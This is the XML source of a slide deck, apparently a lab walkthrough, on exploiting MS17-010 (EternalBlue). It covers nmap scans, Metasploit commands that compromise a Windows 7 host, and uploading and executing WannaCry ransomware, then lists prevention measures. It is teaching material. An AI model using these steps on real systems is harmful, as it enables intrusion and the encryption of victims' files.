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2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0DA65A-58CE-49BF-BEA1-BB3FB621308A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69C82-F12B-4B20-8710-495D51D446B3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FFC2E-A768-43A2-ADEF-BE8D51AB4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17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65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978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39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97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379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81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78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772C379-9A7C-4C87-A116-CBE9F58B04C5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907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17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56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4458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E0816D7-710B-D4C6-4B77-E6DCBAFA6690}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1622323" y="609600"/>
            <a:ext cx="88195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/>
                </a:solidFill>
              </a:rPr>
              <a:t>WannaCry is a ransomware attack that encrypts files on vulnerable Windows computers and demands payment to restore access</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="3200" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="3200" dirty="0">
              <a:solidFill>
                <a:schemeClr val="accent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71CBAD-6378-1BBF-301C-E160C9FFF240}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1622322" y="2939846"/>
            <a:ext cx="940947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/>
                </a:solidFill>
              </a:rPr>
              <a:t>It spread rapidly in May 2017 by exploiting the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="3200" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>EternalBlue</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="3200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t> (MS17-010) vulnerability in Microsoft Windows systems, infecting more than 200,000 computers across over 150 countries.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D80A46-8E64-89F5-2038-170198B435DD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="865239" y="1493167"/>
            <a:ext cx="294967" cy="29496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265BB9-4904-7777-513C-160D2E8E89B7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="865239" y="3775587"/>
            <a:ext cx="294967" cy="29496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210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9ACB-295D-D5A8-4817-B03C0EC0A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10996" y="-1301702"/>
            <a:ext cx="8643154" cy="1969007"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Step 1: Scanning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6CC5E-4A6E-9071-2D56-7C8B9EF1C9D4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="456899" y="3702505"/>
            <a:ext cx="101619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COMMAND : </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>nmap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
              </a:rPr>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Pn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
              </a:rPr>
              <a:t> 10.0.2.0/24</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>Nmap scanned all 256 IP addresses in the subnet.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>Pn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t> tells Nmap to skip ping discovery and assume hosts are online.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400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2CF09-B079-3254-8CBA-7B5D7EA10764}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="456900" y="1199535"/>
            <a:ext cx="102405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2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>USING THE NMAP TOOL </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>Nmap (Network Mapper) is a network scanning tool used to discover hosts, identify open ports, detect running services, and assess potential vulnerabilities on a network.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1364882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D4B1A-29F1-9E0E-3EDF-61EF7F11E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90118" y="-1193547"/>
            <a:ext cx="8643154" cy="1969007"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>STEP 2: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>Analyze</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> Open Ports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2114FD-BBCE-CC42-4163-522A45DF7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124613"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="1455174" y="2689384"/>
          <a:ext cx="9287440" cy="2194560"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr/>
              <a:tblGrid>
                <a:gridCol w="3093014">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3394455355"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="3097213">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1987077740"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="3097213">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="40591955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accent2"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>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accent2"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>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accent2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76796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MSRPC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Windows Remote Procedure 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6998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NetBIOS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File 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9839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Microsoft-DS (SMB)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Windows File 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7321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49152–49158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Dynamic RPC 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Windows Internal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9340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C1405F6-92A4-F25E-34E7-D2494B59681D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1288026" y="1350106"/>
            <a:ext cx="89768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Open ports indicate which services are running.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dirty="0"/>
              <a:t>For the Windows 7 machine (10.0.2.3), Nmap found:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="12135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50443-CED2-0355-7E04-349257676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9680" y="-1252541"/>
            <a:ext cx="8643154" cy="1969007"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Step 3: Scan for Vulnerabilities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1BFBB-6538-323D-2C4B-A93706B161FE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="398507" y="1209368"/>
            <a:ext cx="91486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2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Command : </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>nmap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
              </a:rPr>
              <a:t> --script vuln 10.0.2.3</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>Instead of only checking open ports, this command checks whether known vulnerabilities exist.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>Nmap executed multiple NSE (Nmap Scripting Engine) vulnerability scripts against the target.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58796-8243-DC22-812B-E0D8F9FED185}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="398507" y="3925083"/>
            <a:ext cx="1050085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Result</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>It detected:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/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smb-vuln-ms17-010</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/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State: VULNERABLE</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/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Risk: HIGH</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2246872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D8C1F-EB7F-686C-EF2F-757875F7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9011" y="-1164051"/>
            <a:ext cx="10053783" cy="1969007"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Step 4: Start Metasploit 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440A4A-ECFD-E324-4142-A78F5C8127CD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="393290" y="1101213"/>
            <a:ext cx="89276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Command : </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>msfconsole</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="2400" dirty="0">
              <a:solidFill>
                <a:schemeClr val="accent2"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" sz="2400" dirty="0">
              <a:solidFill>
                <a:schemeClr val="accent2"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>Metasploit loaded successfully and displayed all available exploit modules.</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="20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DA2A88-51BA-1BD6-1658-54F070DFDD1B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="80963" y="3134748"/>
            <a:ext cx="9153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1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Step 5: Search for the MS17-010 Module</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="36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369C8-5F1C-5DCB-1295-C0D4D15F6802}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="393290" y="3998732"/>
            <a:ext cx="884150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Command : </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>search ms17-010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r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>Metasploit listed several modules, including the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0" err="1"/>
              <a:t>EternalBlue</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t> module for testing MS17-010 in supported lab environments.</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="2000" dirty="0">
              <a:solidFill>
                <a:schemeClr val="tx2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16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9115-D56E-4C15-C0A6-07D33236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4" y="-1213212"/>
            <a:ext cx="9798145" cy="1969007"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Step 6: Select the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>EternalBlue</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>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C025D-FCF7-D089-F346-ADD9731C3AFA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="688258" y="776653"/>
            <a:ext cx="91931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Command : </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>use exploit/windows/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>smb</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>/ms17_010_eternalblue</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>This loads the module associated with testing the MS17-010 vulnerability.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938733-158A-70B5-57AA-8C8954DFDF8A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="203869" y="2230763"/>
            <a:ext cx="9556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1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Step 7: View Module Configuration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66CF2F-D9DC-54C7-BF7F-BEE93F4E6EC2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="688258" y="2877094"/>
            <a:ext cx="717754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Command : </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>show options</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>To see which parameters must be configured before running the module.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" b="1" dirty="0"/>
              <a:t>Required Parameters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RHOSTS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RPORT (445)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LHOST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LPORT</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" sz="2400" dirty="0">
              <a:solidFill>
                <a:schemeClr val="accent2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28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0847-EE7A-2100-88EA-268EBFE6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07" y="-1311535"/>
            <a:ext cx="8643154" cy="1969007"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Step 8: Configure the Target Host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315DE-95AB-0AC3-05E5-4BC19F331124}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="511277" y="1258529"/>
            <a:ext cx="70497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Command : </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>set RHOSTS 10.0.2.3</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0"/>
              <a:t>Result</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>RHOSTS =&gt; 10.0.2.3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DA5AC-264D-76D2-FFA9-827438B4E530}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="93107" y="3028335"/>
            <a:ext cx="8170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1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Step 9: Execute the Module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80526F-36F8-42C5-9839-3EE6C35AC52E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="511277" y="3813256"/>
            <a:ext cx="93504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Command : </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>run</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>Metasploit first </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0"/>
              <a:t>verified</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t> that the target was vulnerable to MS17-010. It then established a connection and completed the exploit process in the lab.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2757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196C0B-1D8B-C37E-55AF-C25CAAC4E31A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="186813" y="0"/>
            <a:ext cx="8475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Step 10: Upload </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3600" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Wanacry</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3600" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Ransomeware</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="3600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E0210-4AE5-5CCE-59BF-04C68944BE48}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="599767" y="884904"/>
            <a:ext cx="105303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Command : upload */home/shonak/WannaCry.exe</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:solidFill>
                <a:schemeClr val="accent2"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>The </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0"/>
              <a:t>WannaCry ransomware payload</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t> is then deployed onto the compromised machine. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" sz="2400" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FFC000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFC000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Then execute it</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Command : execute</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" sz="2400" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FFC000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFC000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Once executed, the ransomware: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Encrypts user files.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Generates encryption keys.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Displays a ransom note requesting payment.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Changes the desktop wallpaper.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Attempts to spread to other vulnerable systems through the SMB protocol.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3982526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D9FE6-3F2E-3109-6A0E-5380A10B7A73}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="206477" y="-99232"/>
            <a:ext cx="10559845" cy="6317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3600" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Conclusion &amp; Prevention</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-IN" sz="1400" b="1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IN" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Conclusion</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-IN" sz="1200" b="1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Successfully identified a vulnerable Windows 7 system in a controlled lab.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Detected the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>MS17-010 (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>EternalBlue</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t> vulnerability using Nmap.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Demonstrated the attack lifecycle in an authorized environment.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Understood how WannaCry spread rapidly through vulnerable SMB services.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Learned the importance of cybersecurity testing and vulnerability management. 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3200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Prevention Measures</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-IN" sz="1050" b="1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✅ Install the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>MS17-010</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t> security update.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✅ Disable </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>SMBv1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t> if it is not required.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✅ Keep Windows and software updated.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✅ Maintain regular offline backups.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</a:rPr>
              <a:t>✅ Use antivirus/endpoint protection.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8122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174</TotalTime>
  <Words>550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Rockwell</vt:lpstr>
      <vt:lpstr>Gallery</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>Step 1: Scanning</vt:lpstr>
      <vt:lpstr>STEP 2: Analyze Open Ports</vt:lpstr>
      <vt:lpstr>Step 3: Scan for Vulnerabilities</vt:lpstr>
      <vt:lpstr>Step 4: Start Metasploit Framework</vt:lpstr>
      <vt:lpstr>Step 6: Select the EternalBlue Module</vt:lpstr>
      <vt:lpstr>Step 8: Configure the Target Host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shonak tyagi</dc:creator>
  <cp:lastModifiedBy>shonak tyagi</cp:lastModifiedBy>
  <cp:revision>2</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-07-24T12:17:26Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-10-02T07:21:13Z</dcterms:modified>
</cp:coreProperties>
</file>